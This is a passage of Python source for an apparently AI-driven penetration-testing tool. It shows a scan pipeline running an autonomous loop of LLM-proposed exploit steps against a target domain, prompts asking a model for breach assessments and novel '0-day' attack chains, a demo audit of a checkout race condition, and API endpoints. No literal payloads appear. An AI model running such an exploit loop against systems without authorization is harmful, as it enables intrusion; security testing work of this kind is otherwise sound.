        if base_url and model and api_key and (attack_results or data.get("bb_origins") or data.get("bb_cors")):
            log_state("Running autonomous agentic exploit loop (LLM-proposed steps)...")
            emit_ir("tool.call", {"call_id": f"bb-agentic-{eid}", "name": "Agentic exploit loop", "target": domain, "category": "exploit"})
            agentic = _agentic_exploit_loop(domain, live_urls, data, base_url, model, api_key, iterations=6, emit=lambda m: emit_ir("message", {"role": "assistant", "text": m}))
            data["bb_agentic"] = agentic
            agentic_findings = _agentic_to_findings(agentic)
            if agentic_findings:
                data.setdefault("bb_agentic_findings", []).extend(agentic_findings)
                data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + eng.get("findings", [])
                emit_ir("message", {"role": "assistant", "text": f"**Agentic discoveries**: **{len(agentic_findings)}** new finding(s) promoted from exploit loop."})
            emit_ir("message", {"role": "assistant", "text": f"**Agentic exploit loop**: executed **{len(agentic)}** LLM-proposed steps."})
            for step in agentic:
                emit_ir("message", {"role": "assistant", "text": f"Step `{step.get('command','')[:80]}` → **{step.get('outcome','')}** ({step.get('evidence','')[:160]})"})
            emit_ir("tool.result", {"call_id": f"bb-agentic-{eid}", "status": "ok" if agentic else "empty", "result": f"{len(agentic)} steps executed"})
        else:
            emit_ir("tool.result", {"call_id": f"bb-agentic-{eid}", "status": "skipped", "result": "no model or no findings to pursue"})

        emit_ir("health.assessment", {"score": 0.6 if len(data.get("bb_takeover", [])) + len(data.get("bb_cors", [])) + len(data.get("bb_open_redirect", [])) > 0 else 0.8, "signals": ["bug_bounty_scan"]})

        # Phase 12: AI Assessment
        log_state("AI is analyzing findings...")
        emit_ir("message", {"role": "assistant_thinking", "text": f"Analyzing all findings for breach assessment..."})
        if base_url and model and api_key:
            summary_lines = []
            summary_lines.append(f"Target: {domain}")
            summary_lines.append(f"Subdomains: {len(subs)}")
            summary_lines.append(f"Live HTTP: {sum(1 for v in http_results.values() if v.get('status') == 200)}")
            summary_lines.append(f"Open Ports: {sum(len(v) for v in ports.values())}")
            summary_lines.append(f"S3 Buckets: {len(csp_data.get('s3_buckets', []))}")
            summary_lines.append(f"API Endpoints: {len(api_eps)}")
            if http_results:
                summary_lines.append("Services:")
                for url, info in sorted(http_results.items()):
                    summary_lines.append(f"  {url} [{info.get('status')}] {info.get('server','')} {info.get('title','')}")
            if ports:
                summary_lines.append("Ports:")
                for ip, port_list in ports.items():
                    summary_lines.append(f"  {ip}: {port_list}")
            if data.get("bb_takeover"):
                summary_lines.append(f"Takeover candidates: {sum(1 for t in data['bb_takeover'] if t.get('vulnerable'))}")
            if data.get("bb_cors"):
                summary_lines.append(f"CORS misconfigurations: {len(data['bb_cors'])}")
            if data.get("bb_open_redirect"):
                summary_lines.append(f"Open redirects: {len(data['bb_open_redirect'])}")
            if data.get("bb_injection"):
                summary_lines.append(f"XSS candidates: {sum(1 for f in data['bb_injection'] if f.get('type') == 'XSS')}")
            if data.get("bb_dirbust"):
                _fp = data.get("bb_dirbust_fp", {}).get("false_positives", 0)
                summary_lines.append(f"Exposed dirs/files: {sum(len(v) for v in data['bb_dirbust'].values())} ({_fp} FPs filtered)")
            if data.get("bb_health_endpoints"):
                summary_lines.append(f"Exposed endpoints: {len(data['bb_health_endpoints'])}")
            if data.get("missing_security_headers"):
                summary_lines.append("Missing security headers: " + ", ".join(data["missing_security_headers"][:8]))
            if data.get("bb_tech"):
                for t in list(data["bb_tech"])[:6]:
                    summary_lines.append(f"Tech: {t}")
            if data.get("secrets"):
                summary_lines.append(f"Potential secrets: {len(data['secrets'])}")
            if data.get("wayback"):
                summary_lines.append(f"Wayback URLs: {len(data['wayback'].get('urls', []))}")
            if data.get("pd_nuclei"):
                summary_lines.append(f"Nuclei findings: {len(data['pd_nuclei'])}")
            if data.get("skill_results"):
                summary_lines.append(f"Exploit skill results: {len(data['skill_results'])}")
            if data.get("bb_origins"):
                confirmed_origins = [o for o in data["bb_origins"] if o.get("confirmed")]
                non_cdn = [o for o in data["bb_origins"] if not o.get("is_cdn")]
                if confirmed_origins:
                    summary_lines.append(f"Confirmed origin IPs (CDN bypass): {', '.join(o['ip'] for o in confirmed_origins[:10])}")
                elif non_cdn:
                    summary_lines.append(f"Non-CDN IPs (possible origins): {', '.join(o['ip'] for o in non_cdn[:10])}")
            if data.get("bb_login"):
                rl = [f for f in data["bb_login"] if "issue" in f]
                if rl:
                    summary_lines.append(f"Login endpoints without rate limiting: {len(rl)} (brute-forceable)")
            if data.get("bb_sourcemap"):
                for r in data["bb_sourcemap"]:
                    if r.get("kind") == "sourcemap_endpoints":
                        eps = r.get("endpoints", [])
                        if eps:
                            summary_lines.append(f"Source-map/JS endpoints: {len(eps)}")
                            for ep in eps[:8]:
                                summary_lines.append(f"  Endpoint: {ep}")
            if data.get("bb_wayback"):
                for r in data["bb_wayback"]:
                    if r.get("kind") == "wayback_secrets" and r.get("secrets"):
                        for s in r["secrets"][:8]:
                            summary_lines.append(f"Wayback secret: {s}")
                    if r.get("kind") == "wayback_interesting" and r.get("urls"):
                        for u in r["urls"][:8]:
                            summary_lines.append(f"Wayback sensitive URL: {u}")
            if data.get("bb_default_creds"):
                for f in data["bb_default_creds"][:8]:
                    summary_lines.append(f"Default creds accepted: {f.get('username')}/{f.get('password')} on {f.get('url')}")
            if data.get("bb_jwt"):
                crit = [f for f in data["bb_jwt"] if f.get("severity") == "critical"]
                if crit:
                    summary_lines.append(f"JWT/API auth bypass candidates: {len(crit)}")
            if data.get("bb_api"):
                api_hosts = [a for a in data["bb_api"] if a.get("kind") == "api_host"]
                api_eps_found = [a for a in data["bb_api"] if a.get("kind") == "api_endpoint"]
                if api_hosts:
                    summary_lines.append(f"Live API hosts (JSON): {len(api_hosts)}")
                    for a in api_hosts[:5]:
                        summary_lines.append(f"  API: {a['url']} -> HTTP {a['status']} ({a.get('server','')}) {a.get('body_preview','')[:80]}")
                if api_eps_found:
                    summary_lines.append(f"Probed API endpoints: {len(api_eps_found)}")
                    for a in api_eps_found[:10]:
                        summary_lines.append(f"  EP: {a['url']} -> HTTP {a['status']} {a.get('body_preview','')[:80]}")
            if data.get("bb_js"):
                for r in data["bb_js"]:
                    if r.get("kind") == "js_secrets" and r.get("secrets"):
                        summary_lines.append(f"JS secrets: {len(r['secrets'])} (sample: " + "; ".join(f"{s.get('kind')}='{s.get('value','')[:40]}'@{s.get('source','')[:40]}" for s in r["secrets"][:4]) + ")")
                    if r.get("kind") == "js_endpoints" and r.get("endpoints"):
                        summary_lines.append(f"JS endpoints ({len(r['endpoints'])}): " + ", ".join(r["endpoints"][:6]))
                    if r.get("kind") == "graphql_operations" and r.get("operations"):
                        summary_lines.append(f"GraphQL ops in JS: " + ", ".join(r["operations"][:5]))
            if data.get("bb_waf"):
                for r in data["bb_waf"]:
                    if r.get("kind") == "waf_fingerprint":
                        summary_lines.append(f"WAF: {r.get('waf','Unknown')} (server {r.get('server','')}); bypass probes differing: {len(r.get('bypasses', []))}")
            if data.get("bb_openapi"):
                for r in data["bb_openapi"]:
                    if r.get("kind") == "spec_found":
                        summary_lines.append(f"API spec: {r['url']} HTTP {r.get('status')} ({r.get('content_type','')})")
                    if r.get("kind") == "graphql_introspection_open":
                        summary_lines.append(f"GRAPHQL INTROSPECTION OPEN (unauth): {r['url']}")
                    if r.get("kind") == "openapi_paths" and r.get("endpoints"):
                        summary_lines.append(f"OpenAPI paths ({len(r['endpoints'])}): " + ", ".join(r["endpoints"][:8]))
            if data.get("bb_origin_retest"):
                summary_lines.append(f"Origin re-test discrepancies: {len(data['bb_origin_retest'])}")
                for r in data["bb_origin_retest"][:8]:
                    summary_lines.append(f"  Origin {r.get('origin_ip')} {r.get('path')}: origin HTTP {r.get('origin_status')}({r.get('origin_len')}b) vs CDN HTTP {r.get('cdn_status')} [{r.get('issue')}]")
            cf_hunt = data.get("bb_cf_hunt", {})
            if cf_hunt.get("origin_ips"):
                cf_confirmed = [o for o in cf_hunt["origin_ips"] if o.get("confirmed")]
                if cf_confirmed:
                    summary_lines.append(f"Dedicated CDN origin hunt: {len(cf_confirmed)} confirmed origins: " + ", ".join(f"{o['ip']} ({o.get('evidence','')[:40]})" for o in cf_confirmed[:6]))
                if cf_hunt.get("cloudfront"):
                    summary_lines.append(f"CloudFront confirmed (POP {cf_hunt.get('cloudfront_pop') or 'n/a'})")
                if cf_hunt.get("cdn_edges"):
                    summary_lines.append(f"CDN edges filtered: {len(cf_hunt['cdn_edges'])}")
            if data.get("bb_attack"):
                for f in data["bb_attack"][:15]:
                    summary_lines.append(f"EXPLOIT {f.get('severity','').upper()}: {f.get('type')} @ {f.get('url')} [CWE-{f.get('cwe')}] payload={f.get('payload','')[:60]} evidence={f.get('evidence','')[:100]}")

            ai_prompt = f"""You are a senior penetration tester writing a breach assessment from ACTUAL scan data. The data below is the complete result of a live scan — treat it as ground truth, never invent findings that are not present.

Scan data:
{' '.join(summary_lines)}

User's original prompt: {prompt}

RULES:
- ONLY reference findings that appear in the scan data above.
- If the scan found vulnerabilities (open ports with risky services, exposed endpoints, leaked secrets, CORS/redirect/injection hits, missing security headers, public S3 buckets, etc.), analyze THOSE specifically with evidence from the data.
- If the scan found NO vulnerabilities, say so directly and plainly. Do not pad with generic security advice, hypotheticals, or textbook methodology. State what was tested and that nothing exploitable was found.
- Never write "run nmap/nikto/hydra next" as if it were an exploit step — the scan already ran. Only mention a next step if the data indicates a concrete lead worth pursuing.
- Output format:
  ## Attack Surface (from data)
  ## Weakest Entry Points (only what the data supports, or "none found")
  ## Evidence & Findings (list concrete items with the actual data)
  ## Risk Rating: CRITICAL / HIGH / MEDIUM / LOW / NOTHING FOUND
Keep it under 400 words."""

            emit_ir("tool.call", {"call_id": f"ai-{eid}", "name": "AI breach assessment", "target": model, "category": "read"})
            ai_messages = [
                {"role": "system", "content": "You are a professional penetration tester. Be direct, technical, and actionable."},
                {"role": "user", "content": ai_prompt}
            ]
            ai_result = call_model(base_url, model, api_key, ai_messages, timeout=120)
            if ai_result.startswith("AI_ERROR"):
                time.sleep(2)
                ai_result = call_model(base_url, model, api_key, ai_messages, timeout=180)
            data["ai_analysis"] = ai_result
            emit_ir("tool.result", {"call_id": f"ai-{eid}", "status": "ok" if "AI_ERROR" not in ai_result else "error", "result": "assessment complete"})
            log_state("AI assessment complete")
            emit_ir("message", {"role": "assistant", "text": f"**Breach Assessment Complete**\n\n{ai_result}"})

            # AI 0-day / novel attack hypothesis phase
            log_state("Hunting for novel attack hypotheses (0-day style)...")
            emit_ir("tool.call", {"call_id": f"ai0d-{eid}", "name": "AI 0-day hypothesis", "target": model, "category": "read"})
            if "AI_ERROR" not in ai_result:
                try:
                    techs_known = []
                    for tlist in (data.get("bb_tech") or {}).values():
                        techs_known.extend(tlist)
                    sm_eps = []
                    for r in (data.get("bb_sourcemap") or []):
                        if r.get("kind") == "sourcemap_endpoints":
                            sm_eps.extend(r.get("endpoints", []))
                    od_prompt = f"""You are an elite bug bounty hunter doing novel-vulnerability research. Based ONLY on the concrete attack surface below, hypothesize 2-5 NON-textbook, specific attack chains that could plausibly lead to a real breach on THIS exact stack. Think like someone hunting for a 0-day or an overlooked logical bug — session confusion, IDOR across subdomains, header/SSRF propagation through the CDN, dev-only endpoints reaching prod data, auth silo confusion, caching/CDN key poisoning, subdomain-to-api trust, etc.

Attack surface (real, from scan):
{' '.join(summary_lines)}

Detected technologies: {', '.join(sorted(set(techs_known))[:20]) or 'unknown'}
Source-map/JS endpoints (partial): {', '.join(sm_eps[:15]) or 'none'}
Origin IPs (non-CDN): {', '.join(o['ip'] for o in (data.get('bb_origins') or []) if not o.get('is_cdn'))[:150]}

RULES:
- Each hypothesis must be concrete and testable: name the exact request/test to run, what success looks like, and why THIS stack is exposed to it.
- Clearly label each as HIGH-VALUE or SPECULATIVE.
- Do not invent facts about the target beyond the data given; frame them as "if X then Y" tests.
- No generic OWASP filler — only chains specific to this target's surface.
- Output as a numbered list, under 350 words."""
                    od_prompt_messages = [
                        {"role": "system", "content": "You are an elite bug bounty hunter researching novel attack chains. Be specific and technical."},
                        {"role": "user", "content": od_prompt}
                    ]
                    od_result = call_model(base_url, model, api_key, od_prompt_messages, timeout=120)
                    if od_result.startswith("AI_ERROR"):
                        time.sleep(2)
                        od_result = call_model(base_url, model, api_key, od_prompt_messages, timeout=180)
                    data["ai_0day_hypotheses"] = od_result if "AI_ERROR" not in od_result else ""
                    if "AI_ERROR" not in od_result:
                        emit_ir("message", {"role": "assistant", "text": f"**Novel Attack Hypotheses (0-day hunt):**\n\n{od_result}"})
                    emit_ir("tool.result", {"call_id": f"ai0d-{eid}", "status": "ok" if "AI_ERROR" not in od_result else "error", "result": "hypotheses generated"})
                except Exception as e:
                    emit_ir("tool.result", {"call_id": f"ai0d-{eid}", "status": "error", "result": str(e)})
        else:
            data["ai_analysis"] = "No AI model configured — skipping breach assessment."
            emit_ir("message", {"role": "assistant", "text": "No AI model configured. Breach assessment skipped."})

        # Generate report
        log_state("Generating report...")
        data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + eng.get("findings", [])
        data["scope"] = eng.get("scope", [])
        data["exclusions"] = eng.get("exclusions", [])
        report = generate_report(data)
        report_id = hashlib.md5(domain.encode()).hexdigest()[:12]
        report_filename = f"{domain.replace('.', '_')}_report_{report_id}.md"
        report_path = os.path.join(DATA_DIR, report_filename)
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(report)

        eng["report_path"] = report_path
        eng["report"] = report
        eng["report_filename"] = report_filename
        eng["status"] = "complete"
        # Copy all findings into eng for state endpoint access
        for key, val in data.items():
            if val and key not in ("domain", "model"):
                eng[key] = val
        log_state(f"Report generated: {report_filename}")
        emit_ir("edit", {"path": report_filename, "lines_added": len(report.splitlines()), "lines_removed": 0})
        emit_ir("verification", {"kind": "report", "command": "generate report", "passed": True})

        cost_est = round(0.01 + (0.005 * len(subs)) + (0.01 if ports else 0) + (0.02 if data.get("ai_analysis") and "AI_ERROR" not in data.get("ai_analysis", "") else 0), 2)
        emit_ir("usage", {"interval": "cumulative", "usage": {"cost_usd": cost_est}})
        emit_ir("run.finished", {"outcome": {"status": "passed"}})
        emit_ir("health.assessment", {"score": 1.0, "recommendation": "none", "signals": ["completed"]})

        meta_up(status="passed")
        emit_sync("done", {"status": "passed"})
        save_scan_history(eid)

    except Exception as e:
        eng["status"] = "error"
        eng["error"] = str(e)
        log_state(f"Error: {e}")
        emit_ir("error", {"scope": "pipeline", "class": type(e).__name__, "message": str(e)})
        emit_ir("run.finished", {"outcome": {"status": "failed"}})
        emit_ir("health.assessment", {"score": 0.0, "recommendation": "none", "signals": ["error"]})
        meta_up(status="failed")
        emit_sync("done", {"status": "failed"})
        save_scan_history(eid)

# ─── DEMO RUNNER ───────────────────────────────────────────────────────

def run_demo():
    """Generate a demo event sequence showing the harness UI in action."""
    eid = uuid.uuid4().hex[:8]
    task_id = eid
    pairs = [
        {"harness": "mrboom", "model": "gpt-5.6-sol"},
        {"harness": "mrboom", "model": "qwen3.6-35b"},
    ]

    def emit_ir(etype: str, payload: dict, pair=pairs[0]):
        ev = {
            "type": etype,
            "ts": datetime.now(timezone.utc).isoformat(),
            "source": {"pair": pair},
            "payload": payload,
            "task_id": task_id,
        }
        emit_sync("ir", ev)

    meta_state.update({"task_id": task_id, "goal": "audit the payment checkout flow for race conditions", "status": "running"})
    emit_sync("meta", dict(meta_state))

    import random
    time.sleep(0.5)
    emit_ir("routing.decided", {
        "chosen": pairs[0], "predicted_success": 0.82,
        "why": "Checkout flow involves concurrency — this pair has the strongest race-condition profile",
        "basis": "init",
        "features": {"predicted_success": 0.82, "predicted_cost_usd": 0.45},
        "alternatives": [
            {"label": "mrboom · qwen3.6-35b", "predicted_success": 0.51, "predicted_cost_usd": 0.12, "rejected_because": "lower accuracy on concurrent state"},
            {"label": "mrboom · claude-4-opus", "predicted_success": 0.78, "predicted_cost_usd": 0.89, "rejected_because": "2x cost for marginal gain"},
        ]
    })
    time.sleep(0.6)
    emit_ir("message", {"role": "assistant", "text": "I'll audit the payment checkout flow for race conditions. Starting by exploring the codebase structure and identifying concurrency-sensitive paths."})

    time.sleep(0.4)
    emit_ir("tool.call", {"call_id": "find-1", "name": "grep", "target": "checkout", "category": "search"})
    time.sleep(0.8)
    emit_ir("tool.result", {"call_id": "find-1", "status": "ok", "result": "12 files"})

    emit_ir("tool.call", {"call_id": "find-2", "name": "grep", "target": "balance|deduct|credit", "category": "search"})
    time.sleep(0.7)
    emit_ir("tool.result", {"call_id": "find-2", "status": "ok", "result": "8 files"})

    emit_ir("edit", {"path": "app/services/payment.py", "lines_added": 0, "lines_removed": 0})
    emit_ir("health.assessment", {"score": 0.75, "signals": ["exploring_balance_logic"]})

    time.sleep(0.3)
    emit_ir("message", {"role": "assistant_thinking", "text": "Found the balance deduction at payment.py:142 and the credit issuance at ledger.py:88. These run in separate transactions — there's a window between commit and rollback where the user could double-spend. Let me verify the database isolation level."})

    emit_ir("tool.call", {"call_id": "read-1", "name": "read", "target": "app/services/payment.py", "category": "read"})
    time.sleep(0.5)
    emit_ir("tool.result", {"call_id": "read-1", "status": "ok", "result": "142 lines"})

    emit_ir("tool.call", {"call_id": "read-2", "name": "read", "target": "app/services/ledger.py", "category": "read"})
    time.sleep(0.5)
    emit_ir("tool.result", {"call_id": "read-2", "status": "ok", "result": "88 lines"})

    time.sleep(0.3)
    emit_ir("message", {"role": "assistant", "text": "Found a classic TOCTOU race condition:\n\n- `payment.py:142` deducts balance in a transaction\n- `ledger.py:88` credits the counterparty in a separate transaction\n- Isolation is `READ_COMMITTED` — concurrent requests can observe the old balance before the deduction commits"})

    emit_ir("health.assessment", {"score": 0.35, "signals": ["toctou_race_condition", "read_committed_isolation"], "recommendation": "escalate"})

    time.sleep(0.5)
    emit_ir("checkpoint", {"checkpoint_id": f"ckpt-{uuid.uuid4().hex[:8]}", "reason": "pre_escalation"})

    time.sleep(0.3)
    emit_ir("handoff.emitted", {"depth": "2nd", "token_estimate": 4200})

    time.sleep(0.4)
    emit_ir("routing.decided", {
        "chosen": pairs[1], "predicted_success": 0.91,
        "why": "This pair has stronger background in concurrent database isolation and can write a targeted test + fix",
        "basis": "escalation",
        "features": {"predicted_success": 0.91, "predicted_cost_usd": 0.55},
        "alternatives": [
            {"label": "retry current pair (gpt-5.6-sol)", "predicted_success": 0.4, "predicted_cost_usd": 0.8, "rejected_because": "already exhausted the exploit path"},
        ]
    })
    emit_ir("message", {"role": "assistant", "text": "Pair escalation: handing off to **qwen3.6-35b** which has stronger database race-condition analysis. The issue is clear — let me write a proof-of-concept exploit and the fix."})

    time.sleep(0.5)
    emit_ir("tool.call", {"call_id": "edit-1", "name": "edit", "target": "app/services/payment.py", "category": "edit"})
    time.sleep(1.0)
    emit_ir("tool.result", {"call_id": "edit-1", "status": "ok", "result": "patched"})
    emit_ir("edit", {"path": "app/services/payment.py", "lines_added": 3, "lines_removed": 1})
    emit_ir("health.assessment", {"score": 0.65, "signals": ["fix_applied"]})

    time.sleep(0.3)
    emit_ir("message", {"role": "assistant", "text": "Added `SELECT ... FOR UPDATE` on the balance row before deduction. This serializes concurrent checkout attempts against the same account."})

    emit_ir("verification", {"kind": "pytest", "command": "pytest tests/test_payment_race.py -xvs", "passed": True})
    emit_ir("verification", {"kind": "pytest", "command": "pytest tests/test_ledger.py -xvs", "passed": True})

    time.sleep(0.2)
    emit_ir("usage", {"interval": "cumulative", "usage": {"cost_usd": 0.87}})

    emit_ir("health.assessment", {"score": 0.92, "signals": ["race_condition_patched", "all_tests_passing"], "recommendation": "none"})
    emit_ir("run.finished", {"outcome": {"status": "passed", "summary": {"tests_passed": 24, "tests_failed": 0, "files_changed": 1}}})

    meta_state.update({"task_id": task_id, "goal": "audit the payment checkout flow for race conditions", "status": "passed"})
    emit_sync("meta", dict(meta_state))
    emit_sync("done", {"status": "passed"})

# ─── API ENDPOINTS ──────────────────────────────────────────────

class EngageRequest(BaseModel):
    name: str
    scope: List[str]
    exclusions: List[str] = []

class RunRequest(BaseModel):
    problem: str
    base_url: str = ""
    model: str = ""
    api_key: str = ""

class ModelsRequest(BaseModel):
    base_url: str
    api_key: str = "not-needed"

@app.get("/api/models/discover")
def discover_models(base_url: str = "", api_key: str = "not-needed"):
    if not base_url:
        return {"models": []}
    models = fetch_models(base_url, api_key)
    return {"models": models}

@app.post("/api/models/discover")
def discover_models_post(req: ModelsRequest):
    models = fetch_models(req.base_url, req.api_key)
    return {"models": models}

@app.post("/api/engagements")
def create_engagement(req: EngageRequest):
    eid = uuid.uuid4().hex[:8]
    code = _session_code()
    DB[eid] = {
        "id": eid, "code": code, "name": req.name, "scope": ",".join(req.scope),
        "status": "idle", "logs": [], "progress": "Created",
        "report": "", "report_path": "", "report_filename": "",
        "base_url": "", "model": "", "api_key": "", "prompt": "",
        "events": [], "chat": [],
    }
    return {"id": eid, "code": code}

@app.post("/api/engagements/{eid}/run")
def run_engagement(eid: str, req: RunRequest):
    if eid not in DB:
        raise HTTPException(404, "engagement not found")
    eng = DB[eid]
    if eng["status"] == "running":
        raise HTTPException(409, "already running")

    eng["status"] = "running"
    eng["prompt"] = req.problem
    eng["base_url"] = req.base_url
    eng["model"] = req.model
    eng["api_key"] = req.api_key
    eng["logs"] = []
    eng["events"] = []
    eng["progress"] = "Starting..."

    def _timeout_watchdog(eid_ref, thread_ref, timeout_sec=300):
        thread_ref.join(timeout=timeout_sec)
        if thread_ref.is_alive() and DB.get(eid_ref, {}).get("status") == "running":
            eng_ref = DB[eid_ref]
            eng_ref["status"] = "error"
            eng_ref["error"] = f"Pipeline timed out after {timeout_sec}s"
            eng_ref["logs"].append({"t": now(), "msg": eng_ref["error"]})
            meta_state.update({"task_id": eid_ref, "status": "failed"})
            emit_sync("meta", dict(meta_state))
            emit_sync("done", {"status": "failed"})

    t = threading.Thread(target=run_oneshot, args=(eid,), daemon=True)
    t.start()
    import os as _os
    _to = int(_os.environ.get("DRDOOM_PIPELINE_TIMEOUT", "3600"))
    watchdog = threading.Thread(target=_timeout_watchdog, args=(eid, t, _to), daemon=True)
    watchdog.start()
    return {"ok": True}

@app.post("/api/models/check")
def check_model_ep(req: RunRequest):
    """Check if a model is available / loaded before starting a run."""
    if not req.base_url or not req.model:
        return {"available": False, "error": "missing url or model"}
    ok = check_model(req.base_url, req.model, req.api_key)
    return {"available": ok, "error": "" if ok else "model not found or not loaded"}

class ChatRequest(BaseModel):
    message: str

@app.post("/api/engagements/{eid}/chat")
def chat_engagement(eid: str, req: ChatRequest):
    """Chat with the model about engagement findings."""
    if eid not in DB:
        raise HTTPException(404, "not found")
    eng = DB[eid]
    base_url = eng.get("base_url", meta_state.get("base_url", ""))
    model = eng.get("model", "")
    api_key = eng.get("api_key", "not-needed")
    if not base_url or not model:
        raise HTTPException(400, "no model configured for this engagement")
    if "chat" not in eng:
        eng["chat"] = []
    context = ""
    if eng.get("report"):
        context = f"The full engagement report is available. The target was {eng.get('scope', '?')}.\n\nReport summary:\n{eng['report'][:2000]}"
    elif eng.get("events"):
        summaries = []
        for ev in eng["events"][-30:]:
            p = ev.get("payload", {})
            t = ev.get("type", "")
            if t == "message" and p.get("role") == "assistant":
                summaries.append(f"AI: {p.get('text','')[:200]}")
            elif t == "tool.result":
                summaries.append(f"Tool {p.get('call_id','?')}: {p.get('status','?')} - {p.get('result','')[:100]}")
            elif t == "verification":
                summaries.append(f"Check {p.get('command','?')}: {'passed' if p.get('passed') else 'failed'}")
        context = "Engagement findings:\n" + "\n".join(summaries[-15:])

    # PentestGPT-style interactive session commands against the task tree
    cmd = req.message.strip().lower()
    ptt = eng.get("bb_ptt")
    if cmd in ("next", "todo", "ptt", "tasks") and ptt:
        nodes = ptt.get("nodes", [])
        unresolved = [n for n in nodes if n.get("status") == "unresolved"]
        pending = [n for n in nodes if n.get("status") == "pending"]
        reply = {"role": "assistant",
                 "text": (f"**Pentest Task Tree** — {len(nodes)} tasks / {len(ptt.get('stages', []))} stages.\n\n"
                          + ("**⚠️ Unresolved findings:**\n" + "\n".join(f"- {n.get('task','?')} ({n.get('stage','?')}) — {n.get('detail','')}" for n in unresolved[:10]) if unresolved else "No unresolved findings.")
                          + ("\n\n**⏳ Pending follow-ups:**\n" + "\n".join(f"- {n.get('task','?')} ({n.get('stage','?')})" for n in pending[:10]) if pending else "")),
                 "ts": now()}
        eng["chat"].append({"role": "user", "text": req.message, "ts": now()})
        eng["chat"].append(reply)
        ev = {"type": "chat.message", "ts": datetime.now(timezone.utc).isoformat(), "source": {"pair": {"harness": "chat", "model": model}}, "payload": {"role": "user", "text": req.message}, "task_id": eid}
        emit_sync("ir", ev)
        ev2 = {"type": "chat.message", "ts": datetime.now(timezone.utc).isoformat(), "source": {"pair": {"harness": "chat", "model": model}}, "payload": reply, "task_id": eid}
        emit_sync("ir", ev2)
        return {"reply": reply["text"]}
    if cmd.startswith("discuss ") and ptt:
        term = req.message.strip()[8:].lower()
        hits = [n for n in ptt.get("nodes", []) if term in (n.get("task") or "").lower() or term in (n.get("stage") or "").lower() or term in (n.get("url") or "").lower()]
        reply = {"role": "assistant",
                 "text": ("**Discuss: " + req.message.strip()[8:] + "**\n\n" +
                          "\n".join(f"- {n.get('stage','?')} / {n.get('task','?')} — `{n.get('status','?')}` — {n.get('detail','')}" for n in hits[:10])
                          if hits else f"No task tree node matches '{req.message.strip()[8:]}'."),
                 "ts": now()}
        eng["chat"].append({"role": "user", "text": req.message, "ts": now()})
        eng["chat"].append(reply)
        emit_sync("ir", {"type": "chat.message", "ts": datetime.now(timezone.utc).isoformat(), "source": {"pair": {"harness": "chat", "model": model}}, "payload": {"role": "user", "text": req.message}, "task_id": eid})
        emit_sync("ir", {"type": "chat.message", "ts": datetime.now(timezone.utc).isoformat(), "source": {"pair": {"harness": "chat", "model": model}}, "payload": reply, "task_id": eid})
        return {"reply": reply["text"]}

    messages = [{"role": "system", "content": f"You are a senior penetration testing assistant. You have access to the following engagement context:\n\n{context}\n\nAnswer the user's follow-up questions about this engagement concisely and technically."}]
    for m in eng["chat"][-10:]:
        messages.append({"role": "user" if m["role"] == "user" else "assistant", "content": m["text"]})
    messages.append({"role": "user", "content": req.message})
    result = call_model(base_url, model, api_key, messages, timeout=60)
    eng["chat"].append({"role": "user", "text": req.message, "ts": now()})
    if result.startswith("AI_ERROR:"):
        reply = {"role": "assistant", "text": f"Error calling model: {result[9:]}", "ts": now()}
    else:
        reply = {"role": "assistant", "text": result, "ts": now()}
    eng["chat"].append(reply)
    # Broadcast chat events via SSE
    ev = {"type": "chat.message", "ts": datetime.now(timezone.utc).isoformat(), "source": {"pair": {"harness": "chat", "model": model}}, "payload": {"role": "user", "text": req.message}, "task_id": eid}
    emit_sync("ir", ev)
    ev2 = {"type": "chat.message", "ts": datetime.now(timezone.utc).isoformat(), "source": {"pair": {"harness": "chat", "model": model}}, "payload": reply, "task_id": eid}
    emit_sync("ir", ev2)
    return {"reply": reply["text"]}

@app.get("/api/engagements/{eid}/chat")
def get_chat(eid: str):
    if eid not in DB:
        raise HTTPException(404, "not found")
    return {"messages": DB[eid].get("chat", [])}

class FreeChatRequest(BaseModel):
    message: str
    model: str = ""
    base_url: str = ""
    api_key: str = ""
    history: List[dict] = []

@app.post("/api/chat/free")
def free_chat(req: FreeChatRequest):
    """Standalone chat with a model — no engagement required."""
    if not req.base_url or not req.model:
        raise HTTPException(400, "model not configured")
    messages = [{"role": "system", "content": "You are a helpful technical assistant. Answer concisely and accurately."}]
    for m in req.history[-20:]:
        messages.append({"role": m.get("role", "user"), "content": m.get("content", "")})
    messages.append({"role": "user", "content": req.message})
    result = call_model(req.base_url, req.model, req.api_key, messages, timeout=60)
    if result.startswith("AI_ERROR:"):
        return {"reply": f"Error calling model: {result[9:]}"}
    return {"reply": result}

@app.get("/api/engagements/{eid}/state")
def get_state(eid: str):
    if eid not in DB:
        raise HTTPException(404, "not found")
    eng = DB[eid]
    # Include scan findings data for the findings dashboard
    scan_data = {k:v for k,v in eng.items() if k not in ("status","progress","logs","events","report","report_path","report_filename","error","scope","code","task_id","prompt","base_url","model","api_key","name","created_at","completed_at","_events") and v is not None}
    return {
        "code": eng.get("code", ""),
        "status": eng["status"],
        "progress": eng["progress"],
        "logs": eng["logs"][-50:],
        "events": eng.get("events", [])[-100:],
        "report_ready": eng["status"] == "complete",
        "report_filename": eng.get("report_filename", ""),
        "error": eng.get("error", ""),
        **scan_data,
    }

@app.get("/api/engagements/{eid}/events")
def get_events(eid: str):
    """Get all events for a session (for restoring UI after refresh)."""
    if eid in DB:
        return {"events": DB[eid].get("events", [])[-200:]}
    scans = load_scan_history()
    for s in scans:
        if s.get("id") == eid:
            return {"events": s.get("events", [])}
    raise HTTPException(404, "session not found")

@app.get("/api/engagements/{eid}/report")
def get_report(eid: str):
    if eid not in DB:
        raise HTTPException(404, "not found")
    eng = DB[eid]
    if not eng.get("report"):
        raise HTTPException(404, "report not generated yet")
    return {"report": eng["report"]}

def _report_source(eid):
    """Return (report_text, filename) from in-memory DB or persisted history."""
    if eid in DB and DB[eid].get("report"):
        eng = DB[eid]
        return eng["report"], eng.get("report_filename") or f"{eid}.md"
    for s in load_scan_history():
        if s.get("id") == eid and s.get("report"):
            return s["report"], s.get("report_filename") or f"{eid}.md"
    return None, None

@app.get("/api/engagements/{eid}/download")
def download_report(eid: str):
    report, filename = _report_source(eid)
    if not report:
        raise HTTPException(404, "report not found")
    return PlainTextResponse(
        report,
        media_type="text/markdown",
        headers={
